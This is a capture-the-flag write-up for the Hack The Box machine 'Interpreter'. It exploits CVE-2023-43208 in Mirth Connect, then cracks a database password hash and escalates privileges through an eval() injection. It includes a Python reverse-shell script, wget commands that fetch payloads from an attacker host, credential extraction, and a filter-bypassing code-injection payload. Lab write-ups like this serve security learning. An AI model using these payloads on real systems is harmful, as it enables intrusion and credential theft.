# Interpreter - Hack The Box Writeup
**Category:** Linux  
**Difficulty:** Medium 

## Enumeration

### Nmap

Initial scan revealed the following open ports:

```text
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7
80/tcp   open  http     Jetty
443/tcp  open  ssl/http Jetty
6661/tcp open  unknown
```

Browsing the website revealed a healthcare application powered by **Mirth Connect**.

> Mirth Connect (now commonly branded under NextGen Healthcare) is a widely used healthcare integration engine designed to facilitate the exchange of health information between systems.

---

## Identifying the Version

From the web interface, I downloaded the administrator launcher.

Inspection revealed:

```text
Mirth Connect Administrator 4.4.0
```

Research showed that this version is vulnerable to:

```text
CVE-2023-43208
```

which allows remote code execution.

---

# Initial Access

## Exploiting CVE-2023-43208

Using a public exploit, I first verified command execution by making the target request a file from my HTTP server.

Start a web server:

```bash
python3 -m http.server 8000
```

Execute:

```bash
python3 CVE-2023-43208.py \
-u https://10.129.2.188:443 \
-c 'wget http://10.10.15.73:8000/test'
```

The request appeared in my web server logs, confirming RCE.

---

## Obtaining a Reverse Shell

Several reverse shell payloads failed.

The one that worked was a Python reverse shell.

Create `rev.py`:

```python
#!/usr/bin/env python3

import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.15.73",4444))

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

subprocess.call(["/bin/sh","-i"])
```

Host the file:

```bash
python3 -m http.server 8000
```

Download it onto the target:

```bash
python3 CVE-2023-43208.py \
-u https://10.129.2.188:443 \
-c "wget http://10.10.15.73:8000/rev.py -O rev.py"
```

Start a listener:

```bash
nc -lvnp 4444
```

Execute the payload:

```bash
python3 CVE-2023-43208.py \
-u https://10.129.2.188:443 \
-c "python3 rev.py"
```

A reverse shell connected back successfully.

---

# Database Enumeration

After obtaining a shell, I searched for where Mirth Connect stores its credentials.

Inside:

```text
config/mirth.properties
```

I found:

```properties
database.username = mirthdb
database.password = MirthPass123!
```

---

## Connecting to MariaDB

```bash
mariadb -u mirthdb -p'MirthPass123!'
```

The application database was:

```text
mc_bdd_prod
```

---

## Extracting User Hashes

Inside table:

```text
PERSON_PASSWORD
```

I found the following password hash:

```text
u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==
```

By correlating IDs with the `PERSON` table, I determined that the hash belonged to:

```text
sedric
```

---

# Cracking the Password Hash

A quick search revealed that Mirth Connect 4.4.0 uses:

```text
PBKDF2WithHmacSHA256
```

## Step 1: Decode the Hash

```bash
echo 'u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==' \
| base64 -d | xxd -p
```

---

## Step 2: Split Salt and Hash

The decoded bytes contained:

```text
Salt:
bbff8b0413949da7

Hash:
62c8506c30ea080cf2db511d2b939f641243d4d7b8ad76b55603f90b32ddf0fb
```

---

## Step 3: Convert Back to Base64

Salt:

```bash
echo -n 'bbff8b0413949da7' | xxd -r -p | base64
```

Hash:

```bash
echo -n '62c8506c30ea080cf2db511d2b939f641243d4d7b8ad76b55603f90b32ddf0fb' \
| xxd -r -p | base64
```

---

## Step 4: Format for Hashcat

```text
sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
```

---

## Step 5: Crack the Hash

```bash
hashcat hash.txt /usr/share/wordlists/rockyou.txt
```

Recovered password:

```text
snowflake1
```

---

# SSH Access

Using the recovered credentials:

```bash
ssh sedric@10.129.2.188
```

Password:

```text
snowflake1
```

Access obtained.

---

# Privilege Escalation

## LinPEAS Findings

Running LinPEAS revealed an interesting root-owned file:

```text
/usr/local/bin/notif.py
```

Inspecting the source code showed that it was a Flask application listening on:

```text
127.0.0.1:54321
```

The service:

1. Receives XML patient data
2. Processes it through a template function
3. Writes formatted notifications to files

---

## Identifying the Vulnerability

The application constructed a template string using user-controlled XML fields.

Vulnerable code:

```python
template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"

return eval(f"f'''{template}'''")
```

The issue is that:

1. User-controlled data enters `template`
2. Another f-string is created around it
3. `eval()` executes the resulting string

This creates a Python code injection vulnerability.

---

## Accessing the Service

The service only listened locally, so I forwarded the port:

```bash
ssh -L 54321:127.0.0.1:54321 sedric@10.129.2.188
```

---

## Input Validation

The application enforced the following regex:

```text
^[a-zA-Z0-9._'\"(){}=+/]+$
```

Allowed characters:

```text
abcdefghijklmnopqrstuvwxyz
ABCDEFGHIJKLMNOPQRSTUVWXYZ
0123456789
. _ ' " ( ) { } = + /
```

Notably:

```text
Spaces were NOT allowed.
```

---

## Initial Code Execution

The following payload worked:

```text
{__import__("os").popen("whoami").read()}
```

However, more useful commands required spaces, which the regex blocked.

---

## Bypassing the Space Restriction

After experimenting for quite some time, I noticed something interesting.

Supplying:

```xml
<first>goated</first>
<last>root</last>
```

produced:

```text
Patient goated root (M), 26 years old, received from Test at 20230101
```

Notice that the application itself inserts a space between:

```text
first_name last_name
```

This meant I could split a command across both fields and allow the application to create the required space for me.

---

## Reading the Root Flag

First Name:

```text
{__import__("os").popen("cat
```

Last Name:

```text
/root/root.txt").read()}
```

When combined by the application, the final command became:

```python
__import__("os").popen("cat /root/root.txt").read()
```

The server executed it and returned the contents of:

```text
/root/root.txt
```

Root flag obtained.

---

# Lessons Learned

- Always identify the exact version of third-party software.
- Publicly available RCE exploits can provide an immediate foothold.
- Mirth Connect stores useful information in both configuration files and databases.
- Password hashes often require application-specific formatting before they can be cracked.
- `eval()` should never be used on user-controlled input.
- Input validation can often be bypassed by understanding how data is transformed later in the application.
- Small implementation details (such as automatically inserted spaces) can completely break otherwise restrictive filters.

---

**Personal Opinion:** The initial foothold was straightforward thanks to the vulnerable Mirth Connect version. The most interesting part of the box was definitely the privilege escalation, where the challenge wasn't achieving code execution itself but finding a way around the character restrictions imposed by the regex.
